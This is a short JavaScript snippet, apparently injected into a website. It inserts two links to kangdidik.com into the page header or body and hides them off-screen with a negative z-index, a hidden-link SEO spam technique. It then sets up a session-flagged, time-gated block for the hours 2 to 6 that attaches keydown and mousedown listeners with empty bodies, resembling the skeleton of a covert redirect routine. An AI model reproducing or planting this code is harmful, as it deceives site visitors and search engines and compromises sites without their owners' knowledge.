//  console.log(NN)
let EFV='<a href="https://www.kangdidik.com" style="position: absolute;z-index: -9999;left: -100%;">Kangdidik</a><a href="https://www.kangdidik.com" style="position: absolute;z-index: -9999;left: -100%;">Kangdidik</a>'

if(document.querySelector('header')){document.querySelector('header').insertAdjacentHTML('beforeend',EFV);}
else{document.querySelector('body').insertAdjacentHTML('beforeend',EFV);}

if(!sessionStorage.ef&&new Date().getHours()>=2&&new Date().getHours()<=6){
    function AB(CD){
        document.addEventListener(CD,()=>{
                if(!sessionStorage.ef){
               
            }
        })
    }
    AB('keydown'); 
    AB('mousedown');
}
